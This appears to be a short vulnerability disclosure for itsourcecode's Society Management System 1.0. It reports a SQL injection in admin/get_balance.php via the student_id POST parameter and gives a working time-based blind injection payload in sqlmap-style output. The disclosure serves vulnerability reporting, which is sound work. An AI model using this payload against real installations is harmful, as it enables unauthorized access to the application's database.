# Vendor

itsourcecode

# Product

Society Management System

# version

1.0

Download Source Code: https://itsourcecode.com/wp-content/uploads/2021/04/Society-Management-System-Project-In-PHP-Free-Download-Source-Code.zip

# Description

In the admin/get_balance.php page, there is a SQL injection vulnerability. An attacker can inject SQL statements through the student_id parameter.
<img width="1078" alt="image" src="https://github.com/user-attachments/assets/0e3f7977-4d47-4a38-890c-b1b91311404d">


# Poc
```
Parameter: student_id (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: student_id=111231231' AND (SELECT 9827 FROM (SELECT(SLEEP(5)))XYjI) AND 'jqiB'='jqiB
```
